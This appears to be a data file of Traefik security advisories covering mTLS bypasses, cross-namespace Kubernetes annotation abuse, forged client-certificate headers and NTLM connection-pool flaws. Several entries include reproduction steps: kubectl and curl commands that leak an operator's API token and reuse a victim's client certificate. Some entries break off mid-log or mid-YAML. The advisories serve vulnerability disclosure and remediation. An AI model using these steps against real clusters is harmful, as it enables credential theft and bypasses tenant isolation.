'18448:8443' volumes: - ./k3s/output:/output traefik: image: traefik:v3.7.9 network_mode: 'service:k3s' command: - --entrypoints.websecure.address=:8443 - --providers.kubernetesingressnginx=true - --providers.kubernetesingressnginx.endpoint=https://127.0.0.1:6443 - --providers.kubernetesingressnginx.token=${K3S_TOKEN} - --providers.kubernetesingressnginx.certauthfilepath=/etc/traefik/k3s/server-ca.crt - --providers.kubernetesingressnginx.ingressclass=nginx - --providers.kubernetesingressnginx.controllerclass=k8s.io/ingress-nginx - --log.level=DEBUG - --accesslog=true volumes: - ./k3s/server-ca.crt:/etc/traefik/k3s/server-ca.crt:ro ``` The Kubernetes service account used for this isolated test was granted access to read the test resources. The test backend was an nginx service listening on port 8080 and returning: ```text BACKEND_REACHED path=/protected ``` The complete logical Kubernetes resources were: ```yaml apiVersion: v1 kind: Namespace metadata: name: mtls-conflict-lab --- apiVersion: networking.k8s.io/v1 kind: IngressClass metadata: name: nginx spec: controller: k8s.io/ingress-nginx --- apiVersion: v1 kind: ConfigMap metadata: name: backend-nginx-config namespace: mtls-conflict-lab data: default.conf: | server { listen 8080; server_name _; access_log /dev/stdout; default_type text/plain; location / { return 200 'BACKEND_REACHED path=$request_uri\n'; } } --- apiVersion: apps/v1 kind: Deployment metadata: name: backend namespace: mtls-conflict-lab spec: replicas: 1 selector: matchLabels: app: backend template: metadata: labels: app: backend spec: containers: - name: nginx image: nginx:1.27-alpine ports: - name: http containerPort: 8080 readinessProbe: tcpSocket: port: http volumeMounts: - name: config mountPath: /etc/nginx/conf.d/default.conf subPath: default.conf readOnly: true volumes: - name: config configMap: name: backend-nginx-config --- apiVersion: v1 kind: Service metadata: name: backend namespace: mtls-conflict-lab spec: selector: app: backend ports: - name: http port: 8080 targetPort: 8080 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: protected-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [mtls.example.test] secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /protected pathType: Prefix backend: service: name: backend port: name: http --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: same-host-second-ingress namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [mtls.example.test] secretName: server-tls rules: - host: mtls.example.test http: paths: - path: /second pathType: Prefix backend: service: name: backend port: name: http --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: single-router-control namespace: mtls-conflict-lab annotations: nginx.ingress.kubernetes.io/auth-tls-secret: 'mtls-conflict-lab/client-ca' nginx.ingress.kubernetes.io/auth-tls-verify-client: 'on' spec: ingressClassName: nginx tls: - hosts: [control.mtls.example.test] secretName: server-tls rules: - host: control.mtls.example.test http: paths: - path: /protected pathType: Prefix backend: service: name: backend port: name: http ``` The `server-tls` and `client-ca` Secrets are deliberately created separately so that private key material does not need to be embedded in the report. Save the Compose block above as `docker-compose.yml` and the Kubernetes block above as `k8s-manifest.yml` before running the following commands. ### Commands and results ```bash docker compose up -d k3s until test -f k3s/output/kubeconfig.yaml; do sleep 2; done docker cp '$(docker compose ps -q k3s):/var/lib/rancher/k3s/server/tls/server-ca.crt' \ k3s/server-ca.crt export KUBECONFIG='$PWD/k3s/output/kubeconfig.yaml' sed -i.bak 's#https://127.0.0.1:6443#https://127.0.0.1:16448#' \ k3s/output/kubeconfig.yaml until kubectl get nodes >/dev/null 2>&1; do sleep 2; done kubectl -n kube-system create serviceaccount traefik-validation kubectl create clusterrolebinding traefik-validation \ --clusterrole=cluster-admin \ --serviceaccount=kube-system:traefik-validation kubectl apply -f k8s-manifest.yml kubectl -n mtls-conflict-lab create secret tls server-tls \ --cert=certs/server.crt --key=certs/server.key kubectl -n mtls-conflict-lab create secret generic client-ca \ --from-file=ca.crt=certs/ca.crt export K3S_TOKEN='$(kubectl -n kube-system create token traefik-validation)' K3S_TOKEN='$K3S_TOKEN' docker compose up -d traefik kubectl -n mtls-conflict-lab rollout status deployment/backend --timeout=120s sleep 4 ``` Request to the same-host split configuration without a client certificate: ```bash curl --http1.1 -sk -D - -o - \ --resolve mtls.example.test:18448:127.0.0.1 \ https://mtls.example.test:18448/protected ``` Observed result on `traefik:v3.7.9`: ```text HTTP/1.1 200 OK BACKEND_REACHED path=/protected ``` The same request with a valid client certificate also returned `200 OK`: ```bash curl --http1.1 -sk -D - -o - \ --resolve mtls.example.test:18448:127.0.0.1 \ --cert certs/client.crt --key certs/client.key \ https://mtls.example.test:18448/protected ``` Control request to a host served by a single Ingress, without a client certificate: ```bash curl --http1.1 -sk -D - -o - \ --resolve control.mtls.example.test:18448:127.0.0.1 \ https://control.mtls.example.test:18448/protected echo 'curl_exit=$?' ``` Observed control result: ```text curl_exit=56 ``` The `-k` option only disables verification of the local server certificate. It does not provide a client certificate and does not disable server-side client-authentication. ## Impact and preconditions An unauthenticated network client can reach a route intended to require mTLS when all of the following are true: 1. The Kubernetes Ingress NGINX provider is enabled. 2. The same SNI/host is split across multiple HTTPS Ingress objects. 3. The resulting routers receive different TLS option names. 4. At least one of those routes is intended to require and verify client certificates. 5. The affected route is reachable by the client. The issue is configuration-dependent. A host served by a single unambiguous TLS option is not affected by this specific conflict. If an untrusted tenant can create another Ingress for an existing host, that tenant may be able to introduce the conflict. After the conflicting configuration has been accepted, the network client accessing the route does not need Kubernetes credentials or a client certificate. ## Suggested remediation - Reuse one TLS option identity for equivalent host-level client-authentication settings rather than including the Ingress identity in the option name. - Reject or fail closed when same-host routers have conflicting TLS options. - Do not fall back from `RequireAndVerifyClientCert` to a default `NoClientCert` configuration when a same-host conflict involves client auth. - Add a regression test proving that split same-host Ingress objects cannot downgrade `RequireAndVerifyClientCert` to `NoClientCert`. ## Source locations - `pkg/provider/kubernetes/ingress-nginx/kubernetes.go`: generates and attaches the per-Ingress auth-TLS option. - `pkg/server/router/tcp/manager.go`: resolves same-host TLS options and falls back to the default option when they differ. - `pkg/tls/tlsmanager.go`: initializes the default TLS configuration without a client-authentication requirement. </details>

GHSA-m6wx-622r-48r9.title: Kubernetes Ingress service middleware bypasses crossProviderNamespaces
GHSA-m6wx-622r-48r9.description: ## Summary There is a medium severity vulnerability in Traefik's Kubernetes Ingress provider. The `providers.kubernetesIngress.crossProviderNamespaces` allowlist was enforced for the `router.middlewares` and `service.serverstransport` annotations, but not for the `traefik.ingress.kubernetes.io/service.middlewares` Service annotation, whose value was copied into the generated dynamic service without checking the Service's namespace. A tenant restricted to a namespace excluded from the allowlist could therefore attach an operator-owned middleware from another provider to its own Service, and, when that middleware injects a backend credential, recover the credential at a backend it controls. Only the v3.7 line from v3.7.1 onwards is affected: the `crossProviderNamespaces` option was introduced in v3.7.1, and neither Traefik v2 nor the v3 lines up to v3.6 carry it. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.11 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues). <details> <summary>Original Description</summary> ### Summary The Kubernetes Ingress provider does not enforce `crossProviderNamespaces` for the documented `traefik.ingress.kubernetes.io/service.middlewares` Service annotation. A namespace-limited tenant excluded from the allowlist can apply an operator-owned middleware from another provider to its own Service. If that middleware injects a backend credential, the tenant can recover the credential at a backend it controls. ### Details `providers.kubernetesIngress.crossProviderNamespaces` is intended to restrict which Kubernetes namespaces may use cross-provider references. Traefik v3.7.10 correctly checks this option for `router.middlewares` and `service.serverstransport`, but `pkg/provider/kubernetes/ingress/kubernetes.go::loadService` copies `svcConfig.Service.Middlewares` into `svc.Middlewares` without checking the Service namespace. The generated dynamic Service therefore retains a reference such as `operator-secret@file`. During request handling, Traefik resolves and executes that middleware before forwarding the request to the tenant backend. This was reproduced on the current stable v3.7.10 (`2a2349356c01b1b1f7ecddb0c17b30c97f5241e7`). Current `master` was also affected when checked on 2026-08-10. This is related to the `crossProviderNamespaces` advisory family, but it is not the same path as GHSA-42cj-m3vj-89wv or GHSA-96qj-4jj5-wcjc: this issue uses the standard Kubernetes Ingress Service middleware annotation and reaches an HTTP middleware executed before a tenant-controlled backend. ### PoC [traefik-service-middleware-poc.zip](https://github.com/user-attachments/files/30907045/traefik-service-middleware-poc.zip) 1. Start Traefik v3.7.10 with `KUBECONFIG` pointing to an isolated test cluster: ```bash traefik --configFile=static.yml ``` 2. Apply the tenant fixture: ```bash kubectl apply -f tenant.yml kubectl -n poc-tenant rollout status deployment/attacker-backend ``` 3. As the namespace-limited tenant ServiceAccount, add the cross-provider Service middleware reference: ```bash kubectl --as=system:serviceaccount:poc-tenant:tenant-author \ -n poc-tenant annotate service attacker-backend \ traefik.ingress.kubernetes.io/service.middlewares=operator-secret@file ``` 4. After the provider reloads, send one request: ```bash curl -sS -H 'Host: poc.local' http://127.0.0.1:18080/ ``` The tenant backend response contains: ```text X-Operator-Secret: candidate-007-canary ``` Negative control: ```bash kubectl --as=system:serviceaccount:poc-tenant:tenant-author \ -n poc-tenant annotate service attacker-backend \ traefik.ingress.kubernetes.io/service.middlewares- curl -sS -H 'Host: poc.local' http://127.0.0.1:18080/ ``` The route still returns the backend response, but `X-Operator-Secret` is absent. ### Impact An excluded Kubernetes tenant can execute a middleware owned by another Traefik provider on requests to its own backend. In deployments where an operator middleware injects an upstream API key, bearer token, or similar credential, the tenant can disclose that credential without access to the operator configuration or Kubernetes Secrets. The proposed severity is Medium. The attack requires low Kubernetes namespace privileges and a pre-existing security-sensitive middleware whose qualified name is known to the tenant. </details>

GHSA-mhjw-hmjv-p99x.title: Unsynchronized write to the per-connection sticky round tripper shared by concurrent HTTP/2 streams
GHSA-mhjw-hmjv-p99x.description: ## Summary There is a medium severity vulnerability in Traefik's NTLM and Kerberos (Negotiate) backend authentication support. When a backend answers a request with a `WWW-Authenticate: NTLM` or `Negotiate` challenge, Traefik stores a dedicated backend round tripper in the client connection context so that the next requests on that client connection reuse the same authenticated backend connection. That per-connection slot was read and written without any synchronization, while HTTP/2 and HTTP/3 client connections multiplex concurrent requests over a single connection. Concurrent requests racing on the slot could replace a round tripper already in use, orphaning the backend connections it held and breaking the connection-bound authentication for that client, and a torn read of the slot may crash the Traefik process. The fix guards the slot with a mutex and keeps the round tripper already stored for a client connection, so concurrent requests stick exactly once. The same change also dedicates the slot to the `ServersTransport` that created it, which is tracked separately as GHSA-cw35-4q88-3rmp. Traefik v3.0 through v3.6 are affected and no longer receive patches; users on those lines must upgrade to v3.7.14. Traefik v2 is affected from v2.11.0, where NTLM and Kerberos support was introduced; earlier v2 releases and Traefik v1 are not affected. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.58 - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-mwrr-6hp4-pxr6.title: Ingress-NGINX provider forwards forged Ssl-Client-* identity headers on its HTTP route
GHSA-mwrr-6hp4-pxr6.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes Ingress-NGINX provider. For an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-pass-certificate-to-upstream` annotation, the middleware that owns the `Ssl-Client-*` request headers is attached only to the TLS router, so the plaintext HTTP router generated for the same Ingress forwards those headers exactly as the client sent them. That router normally only issues a redirect, but when `nginx.ingress.kubernetes.io/ssl-redirect: 'false'` is set it reaches the backend, and an unauthenticated client can then supply `Ssl-Client-Verify: SUCCESS` together with a chosen certificate subject and issuer. A backend that trusts those proxy-generated fields as an mTLS identity authorizes the request even though no client certificate was presented. Only the Traefik v3.7 line is affected: support for the `auth-tls-pass-certificate-to-upstream` annotation was added in v3.7.0, and earlier versions do not translate it. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-p956-6gvv-mxqp.title: Incomplete fix for GHSA-hrpp-p4fc-wwf8 allows ForwardAuth NTLM authentication bypass via Proxy-Authorization
GHSA-p956-6gvv-mxqp.description: ## Summary There is a high severity authentication vulnerability in Traefik's ForwardAuth middleware when the authentication server uses a connection-bound scheme such as NTLM or SPNEGO/Kerberos 'Negotiate'. The fix for GHSA-hrpp-p4fc-wwf8 sends the subrequests of a client that presents such a credential on a dedicated connection to the authentication server, but it only detects the credential in the `Authorization` header. ForwardAuth also forwards the `Proxy-Authorization` header, and a credential sent in that header still goes through the connection pool shared by every client. An unauthenticated client can then reuse an authentication-server connection already authenticated by another user, receive that user's identity through `authResponseHeaders`, and access the backend as that user. The patched versions apply the same isolation to `Proxy-Authorization`. Traefik v3.0 through v3.6 are end-of-life and are also affected; they will not receive a fix on their own line. As a workaround, set `authRequestHeaders` to a list that does not include `Proxy-Authorization`. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.62 - https://github.com/traefik/traefik/releases/tag/v3.7.18 - https://github.com/traefik/traefik/releases/tag/v3.8.0-rc.2 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-qm9f-w54v-q2qh.title: Preauthenticated Negotiate contaminates Traefik's globally shared backend connection pool
GHSA-qm9f-w54v-q2qh.description: ## Summary There is a high severity authentication vulnerability in Traefik's handling of connection-bound backend authentication (NTLM and SPNEGO/Kerberos 'Negotiate'). For each new frontend connection, Traefik sends the first backend request through a globally shared transport and only switches that connection to an isolated, per-frontend-connection transport *after* it observes an NTLM/Negotiate challenge in the backend's response. When a client preauthenticates — sending a valid `Authorization: Negotiate` token on its first request instead of following the standard challenge-first (`401`) handshake — the backend authenticates the shared-pool connection on that first request and returns a successful response. Because isolation is decided only after the response is seen, the now victim-authenticated backend socket remains in the shared pool, and it is neither drained nor closed. An unrelated, unauthenticated client on a completely separate frontend connection can then be assigned that socket and act with the victim's identity, performing victim-authorized reads or writes. Exploitation requires Traefik to proxy a connection-bound NTLM/Negotiate backend with connection reuse enabled, and a legitimate client that preauthenticates rather than following the standard challenge-first handshake. The ordinary challenge-first flow is not affected: it installs a dedicated backend transport before the credential-bearing request, so the authenticated socket never enters the shared pool. This is a distinct issue from GHSA-qqjf-53cj-pwvv (which fixed a missing HTTP/3 transport holder): it occurs on ordinary HTTP/1.1 and HTTP/2 frontend connections because the credential-bearing first request reaches the shared pool before any holder can isolate it. The behavior was introduced together with connection-bound NTLM/Kerberos support in v2.11.0 and v3.0.0. Traefik v3.0 through v3.6 are end-of-life and are also affected; they will not receive a fix on their own line, and users on those versions must upgrade to v3.7.14. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.58 - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-rh7m-2m44-x32f.title: Traefik: Kubernetes Ingress and Service annotations allow cross-namespace references to Middlewares, ServersTransports, and TLSOptions
GHSA-rh7m-2m44-x32f.description:
## Summary There is a medium severity vulnerability in Traefik's Kubernetes Ingress provider that allows an actor with permission to create or update `Ingress` or `Service` resources in one namespace to reference `Middleware`, `ServersTransport`, and `TLSOption` resources from other namespaces through annotations. Unlike the Kubernetes CRD provider, which rejects such references when `allowCrossNamespace` is disabled, the annotation path performs no namespace validation, partially bypassing namespace-based tenant isolation. In multi-tenant clusters, this can expose another tenant's secrets, such as credentials injected by a `Headers` middleware or a client certificate configured in a `ServersTransport`. The fix introduces the `crossProviderNamespaces` option on the Kubernetes providers, which must be explicitly set to restrict which namespaces are allowed to use cross-provider references; when it is left unset, all namespaces remain allowed. ## Patches - https://github.com/traefik/traefik/releases/tag/v2.11.46 - https://github.com/traefik/traefik/releases/tag/v3.6.17 - https://github.com/traefik/traefik/releases/tag/v3.7.1 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).
Original Description # Traefik: Missing Cross-Namespace Validation When Using K8s Annotations ## Brief Summary Traefik in Kubernetes (K8s) allows cross-namespace access to Traefik resources when using Annotations on Ingress and Service resources. ## Table of Content - [Description](#description) - [Affected Version](#affected-version) - [Source Code References](#source-code-references) - [Prerequisites](#prerequisites) - [Impact](#impact) - [Security Researcher / Reporter](#security-researcher--reporter) - [Proof of Concept](#proof-of-concept) - [Middleware Proof Of Concept](#middleware-proof-of-concept) - [Step 1: Preparation](#step-1-preparation) - [Step 2: Create Victim's Resources](#step-2-create-victims-resources) - [Step 3: Create Attacker Resources](#step-3-create-attacker-resources) - [Step 4: Attacker steals API Token](#step-4-attacker-steals-api-token) - [ServersTransport Proof Of Concept](#serverstransport-proof-of-concept) - [Step 1: Create Victim and Attacker Namespaces](#step-1-create-victim-and-attacker-namespaces) - [Step 2: Create Victim Resources](#step-2-create-victim-resources) - [Step 3: Create Attacker Resources](#step-3-create-attacker-resources-1) - [Step 3: Attacker steals Client Certificate to authenticate against protected resource living in the victim's own namespace](#step-3-attacker-steals-client-certificate-to-authenticate-against-protected-resource-living-in-the-victims-own-namespace) - [Recommendation](#recommendation) - [Appendix](#appendix) - [Resources](#resources) - [PoC router.middlewares / victim.yaml](#poc-routermiddlewares--victimyaml) - [PoC router.middlewares / attacker.yaml](#poc-routermiddlewares--attackeryaml) - [PoC service.serverstransport / victim.yaml](#poc-serviceserverstransport--victimyaml) - [PoC service.serverstransport / attacker.yaml](#poc-serviceserverstransport--attackeryaml) - [PoC router.middlewares intern-demo-access-victims-pod-wo-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-wo-authtxt) - [PoC router.middlewares intern-demo-access-victims-pod-with-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-with-authtxt) - [Test Setup](#test-setup) ## Description When using the Ingress and Service Annotations, it is possible to reference Middlewares, ServersTransports, and TLSOptions from foreign namespaces. While this is disallowed by default for Traefik's Kubernetes CRDs (by the [Configuration Option ``providers.kubernetesCRD.allowCrossNamespace``](https://doc.traefik.io/traefik/reference/install-configuration/providers/kubernetes/kubernetes-crd/#opt-providers-kubernetesCRD-allowCrossNamespace)), no validation is done when using Annotations on K8s Ingress and Service resources. An attacker can include these resources in an Ingress or Service configuration and thereby partially bypassing namespace-based tenant isolation. In certain cases, this will give an attacker access to data of services in other namespaces, for instance: - If a middleware adds an API access token through the Header middleware, an attacker can steal this token. - An attacker could include a ServersTransport that does client certificate authentication against a service to access this service. - An attacker could include a ForwardAuth middleware to gain access to the internal response headers of the forward auth service and thus might steal internal tokens. ## Affected Version The vulnerability was tested in the current Traefik version v3.6.5. Older versions are affected, too. ## Source Code References Ingress and Service Annotations are vulnerable. There is no check implemented in: [``pkg/provider/kubernetes/ingress/kubernetes.go``](https://github.com/traefik/traefik/blob/f794f8a29491b8467868811a3142a48e8f0a3854/pkg/provider/kubernetes/ingress/kubernetes.go#L202) Traefik's Kubernetes CRDs are not vulnerable and prevent cross namespace access: [``pkg/provider/kubernetes/crd/kubernetes_http.go``](https://github.com/traefik/traefik/blob/f794f8a29491b8467868811a3142a48e8f0a3854/pkg/provider/kubernetes/crd/kubernetes_http.go#L170) ## Prerequisites - Traefik is installed in Kubernetes - No special configuration is required as the ``kubernetesIngress`` provider is enabled by default - The attacker needs permission to create or modify Ingress or Service resources in one namespace - The name of the namespace and the name of the Middleware, TLSOption, or ServersTransport resource they want to target ## Impact An attacker can include Middlewares, ServersTransports, and TLSOptions resources from foreign namespaces in their own Ingress or Service configuration, thereby partially bypassing namespace-based tenant isolation. In certain cases, this will give an attacker access to data of services in other namespaces. ## Security Researcher / Reporter - Lorin Lehawany of ERNW Enno Rey Netzwerke GmbH - Sven Nobis of ERNW Enno Rey Netzwerke GmbH ## Proof of Concept The following descriptions explain the exploitation in detail for the two affected resource types Middleware and ServersTransport. The proof of concept (PoC) was tested in a Traefik setup installed via Helm chart in version `37.4.0`, but with the most recent Traefik app version ``v3.6.5`` and the default configuration. See the [test setup section](#test-setup) for details. ### Middleware Proof Of Concept The following steps demonstrate the problem with the affected ``router.middlewares`` annotation. This PoC even works with restrictive Network Policies set. #### Step 1: Preparation First, the namespaces `traefik-victim` and `traefik-attacker` are created: ```sh kubectl create namespace traefik-victim kubectl create namespace traefik-attacker namespace/traefik-victim created namespace/traefik-attacker created ``` In the next steps, the resources in the `victim.yaml` are created in the namespace `traefik-victim`, and the resources in the `attacker.yaml` are created in the namespace `traefik-attacker`. #### Step 2: Create Victim's Resources This step creates some resources to simulate a typical vulnerable setup with an application that uses Traefik and Ingress. The [`victim.yaml`](#poc-routermiddlewares--victimyaml) creates an Ingress resource with the name `traefik-ingress` in the namespace `traefik-victim`. The Ingress exposes the victim's application under the hostname `traefik-victim.gke.gcp.ernw.eu` and routes all requests with the path prefix `/example-app` to an internal service on port 80. The victim's application is exposed via the service `example-app-service` and protects its resources with an API token internally. The application itself is a simple nginx, which is configured using the ConfigMap to deliver a static HTML page. The server rejects any request that does not contain the predefined `X-API-Token` HTTP header with the correct value. This simulates an internal application that relies on a secret API token for authorization and assumes that only trusted users can provide this token. Further, two Traefik middlewares are defined: `basicauth` and `addheader`. `basicauth` middleware enforces HTTP Basic Authentication, and the `addheader` adds an `X-API-Token` request header with a secret value to all incoming requests to allow access for authorized users. This setup is deployed by the following commands: ```sh $ kubectl apply -f victim.yaml -n traefik-victim ingress.networking.k8s.io/traefik-ingress created service/example-app-service created deployment.apps/example-app created middleware.traefik.io/addheader created middleware.traefik.io/basicauth created secret/authsecret created configmap/nginx-conf created ``` The screenshot `victim-example-app.png` below shows the basic authentication, which is required for users to access the protected resources. After successful authentication, the user is logged in, and the static HTML content is displayed, as shown in the second screenshot (`victim-app.png`) below. The file shows [intern-demo-access-victims-pod-wo-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-wo-authtxt) and [intern-demo-access-victims-pod-with-auth.txt](#poc-routermiddlewares-intern-demo-access-victims-pod-with-authtxt) show that authentication is required when accessing the service internally. #### Step 3: Create Attacker Resources The [`attacker.yaml`](#poc-routermiddlewares--attackeryaml) contains the resources to steal the token from the ``addheader`` Middleware. This attacker-controlled Ingress is deployed in the attacker's namespace and configured to use the victim's Traefik middleware through [the ``router.middlewares`` annotation](https://doc.traefik.io/traefik/reference/routing-configuration/kubernetes/ingress/#on-ingress). The attacker-controlled deployment uses a simple ``whoami`` container which reflects all HTTP response headers. This is used to steal the victim's credentials. This setup is deployed by the following commands in the namespace `traefik-attacker`: ```sh $ kubectl apply -f attacker.yaml -n traefik-attacker ingress.networking.k8s.io/traefik-ingress created deployment.apps/whoami created service/whoami created ``` The following excerpt from the Traefik Pod shows that the resource from the victim's namespace is configured in the attacker's namespace: ```log 2025-12-17T19:49:37Z DBG github.com/traefik/traefik/v3/pkg/middlewares/headers/headers.go:26 > Creating middleware entryPointName=websecure middlewareName=traefik-victim-addheader@kubernetescrd middlewareType=Headers routerName=websecure-traefik-attacker-traefik-ingress-traefik-attacker-gke-gcp-ernw-eu-foo@kubernetes 2025-12-17T19:49:37Z DBG github.com/traefik/traefik/v3/pkg/middlewares/headers/headers.go:46 > Setting up customHeaders/Cors from {map[X-API-Token:example-secret-api-token] map[] false [] [] [] [] [] 0 false [] [] map[] 0 false false false false false false false } entryPointName=websecure middlewareName=traefik-victim-addheader@kubernetescrd middlewareType=Headers routerName=websecure-traefik-attacker-traefik-ingress-traefik-attacker-gke-gcp-ernw-eu-foo@kubernetes ``` This behavior is different to Traefik's IngressRoute which prevents this and is *not* vulnerable: ```sh 2025-06-05T19:48:45Z ERR github.com/traefik/traefik/v3/pkg/provider/kubernetes/crd/kubernetes_http.go:82 > Failed to create middleware keys error='middleware default/test is not in the IngressRoute namespace traefik-test' ingress=traefik-route namespace=traefik-test providerName=kubernetescrd 2025-06-05T19:48:45Z DBG github.com/traefik/traefik/v3/pkg/provider/kubernetes/crd/kubernetes_http.go:82 > Failed to create middleware keys error='middleware default/test is not in the IngressRoute namespace traefik-test' ingress=traefik-route namespace=traefik-test providerName=kubernetescrd ``` #### Step 4: Attacker steals API Token As a result, the attacker can obtain the API Token that was originally intended only for the victim’s internal application, without being authorized to the victim’s service. This is done via an attacker accessing his exposed service, which reflects all HTTP response headers, including the `X-Api-Token: example-secret-api-token`. The screenshot ``attacker-controlled-pod-whoami-reflects-all-http-response-headers.png`` below shows this. ### ServersTransport Proof Of Concept The following steps demonstrate the problem with the affected ServersTransport annotation. This PoC does not work if Network Policies filter traffic to the victim's services from the attacker's namespace. #### Step 1: Create Victim and Attacker Namespaces First, the namespaces `traefik-victim` and `traefik-attacker` are created: ```sh kubectl create namespace traefik-victim kubectl create namespace traefik-attacker namespace/traefik-victim created namespace/traefik-attacker created ``` In the next steps, the resources in the `victim.yaml` are created in the namespace `traefik-victim`, and the resources in the `attacker.yaml` are created in the namespace `traefik-attacker`. #### Step 2: Create Victim Resources This step creates some resources to simulate a typical vulnerable setup with an application which is using Traefik and Ingress. It simulates a setup where the internal service (`mtls-nginx`) is protected with mTLS. The [`victim.yaml`](#poc-serviceserverstransport--victimyaml) creates multiple resources to demonstrate the following scenario: A user accesses the application via HTTPS, where access from the outside is restricted through basic authentication and client certificate authentication is enforced inside the cluster. The resource `traefik-ingress` exposes the victim's application under the hostname `traefik-victim.gke.gcp.test.eu` with the path prefix `/example-app` and enforces basic authentication via the `basicauth` middleware. The Ingress forwards traffic to the Service `mtls-nginx`, which represents the nginx Pod. The `mtls-nginx` Service routes traffic to the deployment `mtls-nginx`, which runs the nginx web server. For demonstration-purposes the web server delivers some static content. The ServersTransport resource with the name `serverstransport` defines the mTLS settings for Traefik. It requires to specify the server name, root CA, and client certificate to authenticate with the nginx. To simulate a more realistic scenario, the defined Middleware `basicauth` enforces basic authentication using the Secret `authsecret` for username/password so that access from the outside is restricted. This setup is deployed by the following commands: ```sh $ kubectl apply -f vicitim.yaml -n traefik-victim ingress.networking.k8s.io/traefik-ingress created service/mtls-nginx created deployment.apps/mtls-nginx created serverstransport.traefik.io/serverstransport created configmap/nginx-mtls-conf created configmap/client-ca-cert created secret/nginx-tls created secret/client-cert-secret created secret/nginx-cert created middleware.traefik.io/basicauth created secret/authsecret created ``` #### Step 3: Create Attacker Resources The [`attacker.yaml`](#poc-serviceserverstransport--attackeryaml) contains the resources to get access the victim's mTLS protected service. The attacker's setup exposes the host `traefik-attacker.gke.gcp.ernw.eu` that forwards traffic to a `socat` proxy, which routes HTTPS connections directly to the victim’s mTLS service to authenticate successfully. Traefik perform client certificate authentication with the victim's client certificate through the configuration of the [``service.serverstransport`` annotation](https://doc.traefik.io/traefik/reference/routing-configuration/kubernetes/ingress/#on-service). The attacker does not need RBAC access to the victim's namespace to do it. An attacker can use the ``service.serverstransport`` annotation to do mTLS authentication against other services inside and outside of the cluster, too. This setup is deploy by the following commands in the namespace `traefik-attacker`: ```sh $ kubectl apply -f attacker.yaml -n traefik-attacker ingress.networking.k8s.io/traefik-ingress created service/socat-proxy created deployment.apps/socat-proxy created ``` The following excerpt from the Traefik Pod shows that the resource from the victim's namespace is configured in the attacker's namespace: ```log 2025-12-18T12:08:25Z DBG github.com/traefik/traefik/v3/pkg/server/configurationwatcher.go:227 > Configuration received Client Certificate to authenticate against protected resource living in the victim's own namespace As a result, the attacker is able to authenticate with the client certificate from the victim's namespace against the victim's service and thus bypass the mTLS authentication. The screenshot ``attacker-accessing-victims-protected-resources.png`` below shows this. ## Recommendation Disallow cross-namespaces access for annotations-based configuration by default, as in Traefik's Kubernetes CRDs, and offer a [Configuration Option like ``providers.kubernetesCRD.allowCrossNamespace``](https://doc.traefik.io/traefik/reference/install-configuration/providers/kubernetes/kubernetes-crd/#opt-providers-kubernetesCRD-allowCrossNamespace) to allow it. ## Appendix ### Resources #### PoC router.middlewares / victim.yaml ```yaml kind: Ingress apiVersion: networking.k8s.io/v1 metadata: name: traefik-ingress namespace: traefik-victim annotations: traefik.ingress.kubernetes.io/router.entrypoints: web,websecure traefik.ingress.kubernetes.io/router.middlewares: 'traefik-victim-basicauth@kubernetescrd,traefik-victim-addheader@kubernetescrd' spec: ingressClassName: traefik rules: - GHSA-rv2h-qh7j-xrjw.title: Ingress-NGINX provider: colliding auth-tls-secret names merge two client CAs into one TLS option, so a host is gated by another host's CA
GHSA-rv2h-qh7j-xrjw.description: ## Summary There is a high severity vulnerability in Traefik's Kubernetes Ingress NGINX provider. The TLS option generated for an Ingress carrying the `nginx.ingress.kubernetes.io/auth-tls-secret` annotation is named from the referenced Secret's namespace and name after normalizing them, which replaces every dot with a dash. Two Secrets whose names differ only by a dot and a dash, such as `my.secret` and `my-secret`, therefore produce the same TLS option name, and the Ingress processed second silently reuses the option built for the first one. A host configured to require client certificates issued by its own CA is then gated by another host's CA: certificates from that other CA are accepted, while the host's legitimate clients are refused. In Traefik v3.7.0 to v3.7.10, where the generated name also included the Ingress name, the same collision could occur between Ingresses whose names normalize identically. The provider now keeps the resource names as is in the names it generates. Traefik v2 and Traefik v3 versions before v3.7.0 are not affected: the `auth-tls-secret` annotation is supported by the Ingress NGINX provider since v3.7.0. ## Patches - https://github.com/traefik/traefik/releases/tag/v3.7.14 ## For more information If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

GHSA-ww7c-q3mv-xx22.title: Data race on the shared bufio.Reader after an HTTP/1 upgrade in FastProxy panics the whole process
